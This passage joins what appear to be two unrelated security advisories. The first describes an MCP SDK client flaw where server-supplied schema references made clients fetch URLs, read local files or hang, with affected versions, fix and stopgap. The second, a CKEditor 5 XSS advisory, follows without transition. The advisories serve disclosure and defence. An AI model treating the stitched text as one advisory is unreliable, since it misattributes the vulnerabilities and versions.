- request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and
- stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.

### Am I affected?
Yes, if your application uses the SDK as an MCP client (`ClientSession` over any transport, `ClientSessionGroup`, or the 2.x `Client`) and calls tools on servers you do not fully control. There was no setting that turned the validation off.

Affected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected: applications that only build servers. If nothing in your code uses `ClientSession`, `ClientSessionGroup` or the 2.x `Client` class, you are not affected.

### Fix
Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with `RuntimeError` (`Invalid schema for tool ...`); in-document references such as `#/$defs/...` work as before.

Until you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose `outputSchema` contains an `$id`, or a `$ref` / `$dynamicRef` that does not start with `#`.

### Impact
A Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability could be triggered by inserting specially crafted markup under a specific General HTML Support configuration that allows inserting objects, leading to unauthorized JavaScript code execution in a browser context isolated from the origin of the application embedding the editor.

This vulnerability affects only installations where General HTML Support is enabled and configured to allow the affected HTML content.

### Patches
The problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).
